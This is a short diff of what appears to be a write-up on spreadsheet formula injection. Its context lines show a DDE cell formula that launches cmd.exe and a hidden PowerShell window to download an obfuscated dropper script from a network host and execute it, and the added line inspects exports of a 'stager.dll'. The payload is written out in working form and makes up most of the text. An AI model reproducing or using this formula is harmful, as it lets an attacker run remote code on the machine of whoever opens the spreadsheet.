@@ -73,4 +73,6 @@ For my purpose i finally used the following cell formula (taken from [https://bl
 =MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c powershell.exe -nop -w 1 $e=(New-Object System.Net.WebClient).DownloadString(\"http://192.168.1.24/powershell_dropper_obf.ps1\"); IEX $e'!'A1'
 ```
 
+dumpbin -exports stager.dll 查看dll导出函数
 Cheers,
+  
